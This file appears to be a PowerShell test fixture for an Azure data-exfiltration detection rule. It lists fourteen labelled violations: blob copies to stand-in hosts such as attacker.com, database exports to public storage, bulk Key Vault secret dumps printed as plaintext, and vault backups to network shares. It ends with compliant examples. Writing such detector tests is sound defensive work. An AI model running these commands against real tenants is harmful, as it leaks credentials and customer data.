# =====================================================================
# WARNING: This is a TEST FILE containing INTENTIONAL security violations
# These patterns are FAKE examples for testing purposes
# This file should be EXCLUDED from security scanning
# =====================================================================
# Test script for Azure Data Exfiltration violations
# Rule 39: AzureDataExfiltration

# Violation 1: Copying blob to external URI
$sourceBlob = Get-AzStorageBlob -Container "sensitive-data" -Blob "confidential.txt"
Start-AzStorageBlobCopy -AbsoluteUri "https://external-storage.com/backup/data.txt" -DestBlob "exported.txt"

# Violation 2: Copying blob with destination URI
Start-AzStorageBlobCopy -SourceUri "https://mystorage.blob.core.windows.net/data/file.txt" -DestinationUri "https://external.com/exfil.txt"

# Violation 3: Azure Storage blob copy to external account
Start-AzureStorageBlobCopy -SrcUri "https://internal.blob.core.windows.net/data/secrets.json" -DestinationUri "https://attacker.com/stolen.json"

# Violation 4: Exporting SQL database
Export-AzSqlDatabase -ResourceGroupName "Production" -ServerName "sql-prod" -DatabaseName "CustomerDB" -StorageKeyType "StorageAccessKey" -StorageKey $key -StorageUri "https://backup.blob.core.windows.net/exports/customerdb.bacpac"

# Violation 5: Exporting database to potentially public storage
Export-AzSqlDatabase -ResourceGroupName "RG-Prod" -ServerName "prod-sql-01" -DatabaseName "SensitiveData" -StorageKeyType "Primary" -StorageKey "key123" -StorageUri "https://publicstorage.blob.core.windows.net/backup/db.bacpac"

# Violation 6: Bulk Key Vault secret retrieval in loop
$secrets = Get-AzKeyVaultSecret -VaultName "prod-keyvault"
foreach ($secret in $secrets) {
    $secretValue = Get-AzKeyVaultSecret -VaultName "prod-keyvault" -Name $secret.Name -AsPlainText
    Write-Host "Secret: $secretValue"
}

# Violation 7: Key Vault secret bulk export
$vaultName = "company-vault"
$secretNames = @("DatabasePassword", "APIKey", "AdminPassword", "EncryptionKey")
foreach ($name in $secretNames) {
    $secret = Get-AzKeyVaultSecret -VaultName $vaultName -Name $name
    # Exfiltration code here
}

# Violation 8: Pipeline-based bulk secret retrieval
Get-AzKeyVaultSecret -VaultName "production-kv" | ForEach-Object {
    Get-AzureKeyVaultSecret -VaultName "production-kv" -Name $_.Name
}

# Violation 9: Exporting resource group configuration
Export-AzResourceGroup -ResourceGroupName "Production-RG" -Path "C:\exports\prod-config.json"

# Violation 10: Exporting sensitive resource group
Export-AzResourceGroup -ResourceGroupName "Security-Resources" -Path "\\external-share\backup\security.json" -Force

# Violation 11: Resource group export with all resources
Export-AzResourceGroup -ResourceGroupName "All-Production" -Path "C:\temp\production-export.json" -IncludeParameterDefaultValue

# Violation 12: Backing up Key Vault
Backup-AzKeyVault -VaultName "prod-keyvault" -OutputFile "C:\backups\keyvault.backup"

# Violation 13: Key Vault backup to network location
Backup-AzKeyVault -VaultName "enterprise-kv" -OutputFile "\\fileserver\backups\kv-backup.dat"

# Violation 14: Key Vault backup to potentially uncontrolled location
Backup-AzKeyVault -VaultName "sensitive-vault" -OutputFile "D:\exports\vault.bak"

# Correct usage examples (should not trigger violations)
# Internal blob copy within same account
Start-AzStorageBlobCopy -SrcContainer "source" -SrcBlob "file.txt" -DestContainer "backup" -DestBlob "file-backup.txt" -Context $context

# Single secret retrieval (not in loop)
$singleSecret = Get-AzKeyVaultSecret -VaultName "prod-keyvault" -Name "DatabaseConnectionString"

# Reading resource group info (not exporting)
Get-AzResourceGroup -Name "Production-RG"

# Key Vault list operation (not backup)
Get-AzKeyVault -ResourceGroupName "RG-Prod"

# SQL database backup to authorized internal storage
Export-AzSqlDatabase -ResourceGroupName "Production" -ServerName "sql-prod" -DatabaseName "TestDB" -StorageUri "https://authorized-backup.blob.core.windows.net/backups/test.bacpac" -StorageKeyType "StorageAccessKey" -StorageKey $authorizedKey
